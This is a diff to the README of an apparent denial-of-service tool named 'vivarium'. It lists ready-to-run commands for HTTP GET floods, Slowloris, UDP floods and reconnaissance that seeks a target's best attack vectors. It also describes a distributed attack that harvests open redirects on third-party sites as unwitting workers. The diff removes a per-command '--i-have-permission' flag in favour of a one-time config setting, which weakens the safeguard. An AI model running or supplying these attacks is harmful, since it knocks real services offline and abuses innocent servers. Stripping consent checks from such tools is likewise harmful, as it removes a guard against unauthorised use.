@@ -15,8 +15,8 @@ go build -o vivarium.exe ./cmd/vivarium
 # See available commands
 ./vivarium --help
 
-# Run a basic stress test (requires permission flag)
-./vivarium sting locust --target https://your-target.com --rounds 100 --i-have-permission
+# Run a basic stress test (will prompt for config on first launch)
+./vivarium sting locust --target https://your-target.com --rounds 100
 ```
 
 ## 🏛️ Architecture: The Hive Mind
@@ -37,13 +37,13 @@ Precision strikes from the Queen herself:
 
 ```bash
 # Locust - HTTP GET flood
-vivarium sting locust --target <url> --rounds 1000 --concurrency 100 --i-have-permission
+vivarium sting locust --target <url> --rounds 1000 --concurrency 100
 
 # Tick - Slowloris connection drain
-vivarium sting tick --target <url> --sockets 200 --delay 15s --i-have-permission
+vivarium sting tick --target <url> --sockets 200 --delay 15s
 
 # Fly Swarm - UDP flood
-vivarium sting flyswarm --target <ip> --port 80 --rounds 10000 --i-have-permission
+vivarium sting flyswarm --target <ip> --port 80 --rounds 10000
 ```
 
 ### Swarm (DDoS - Distributed via Open Redirects)
@@ -58,7 +58,7 @@ vivarium forage --output workers.txt
 vivarium comb validate --input workers.txt --output valid.txt
 
 # Launch distributed attack through workers
-vivarium swarm locust --target <url> --comb valid.txt --rounds 100 --i-have-permission
+vivarium swarm locust --target <url> --comb valid.txt --rounds 100
 ```
 
 ## 🔭 Senses (Reconnaissance)
@@ -68,7 +68,7 @@ vivarium swarm locust --target <url> --comb valid.txt --rounds 100 --i-have-perm
 Find the largest resources on a target (best attack vectors):
 
 ```bash
-vivarium sense scout --target https://example.com --depth 2 --top 10 --i-have-permission
+vivarium sense scout --target https://example.com --depth 2 --top 10
 ```
 
 ## 🐝 Foraging (Worker Discovery)
@@ -135,13 +135,14 @@ Set-Alias -Name viv -Value "C:\path\to\vivarium.exe"
 
 ## 🛡️ Ethical Use
 
-This tool requires the `--i-have-permission` flag for all attack operations. This is a reminder that you must:
+This tool requires manual authorization in your configuration file. On first launch, a config file will be created at `~/.vivarium/config.toml`. You must:
 
-1. **Only test systems you own** or have explicit written permission to test
-2. **Never use this tool for malicious purposes**
-3. **Understand the legal implications** in your jurisdiction
+1. **Edit the config file** and set `authorized = true`.
+2. **Only test systems you own** or have explicit written permission to test.
+3. **Never use this tool for malicious purposes**.
+4. **Understand the legal implications** in your jurisdiction.
 
-Using this tool without authorization may be illegal and is strictly prohibited.
+Using this tool without authorization (via manual config override) is strictly prohibited.
 
 ## 📈 Roadmap
 
